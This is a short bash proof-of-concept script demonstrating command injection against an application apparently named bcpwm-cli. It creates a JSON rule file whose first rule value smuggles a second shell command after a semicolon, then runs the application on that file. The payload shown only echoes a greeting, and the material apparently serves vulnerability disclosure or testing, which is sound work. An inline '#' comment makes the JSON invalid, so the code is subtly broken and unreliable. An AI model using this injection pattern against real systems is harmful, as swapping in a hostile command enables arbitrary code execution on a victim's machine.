#!/bin/bash

# Description: This script demonstrates command injection via an untrusted JSON rule file.
# It creates a malicious JSON file with an injection payload and runs the application to exploit the vulnerability.

echo "===== Command Injection Proof of Concept ====="
echo

# Step 1: Create the malicious JSON file
echo "[*] Creating malicious JSON rule file with command injection payload..."

cat > malicious_rules.json << EOF
{
  "chars": "abcABC",
  "min_length": "6",
  "max_length": "8",
  "rules": {
    "0": "[[:alpha:]]; echo 'Hello, World!'",  # Injected shell command
    "1": "[[:upper:]]"
  },
  "min_rules": "2",
  "num_rules": "2",
  "site": "malicious.example.com"
}
EOF

echo "[+] Malicious JSON file 'malicious_rules.json' created."
echo

# Step 2: Execute the vulnerable application
echo "[*] Running the application with the malicious JSON file..."

./bcpwm-cli -a malicious_rules.json  # Replace with the actual command if different



# verification commands 
echo
echo "===== Proof of Concept Completed ====="